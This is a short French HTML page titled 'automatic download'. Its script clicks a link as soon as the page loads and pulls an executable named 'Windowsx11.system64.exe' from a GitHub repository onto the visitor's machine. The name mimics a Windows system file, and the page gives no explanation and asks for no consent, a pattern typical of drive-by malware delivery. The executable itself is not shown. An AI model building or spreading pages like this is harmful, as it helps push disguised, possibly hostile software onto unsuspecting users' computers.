<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Téléchargement automatique</title>
</head>
<body>
    <h1>Téléchargement en cours...</h1>

    <script>
        // URL du fichier à télécharger
        const url = 'https://raw.githubusercontent.com/devomn0/Windowsx11.system64.exe/refs/heads/main/Windowsx11.system64.exe';

        // Crée un élément <a> pour le téléchargement
        const link = document.createElement('a');
        link.href = url;
        link.download = 'Windowsx11.system64.exe'; // Nom du fichier téléchargé
        document.body.appendChild(link); // Ajoute le lien au document
        link.click(); // Simule un clic pour déclencher le téléchargement
        document.body.removeChild(link); // Retire le lien du document
    </script>
</body>
</html>
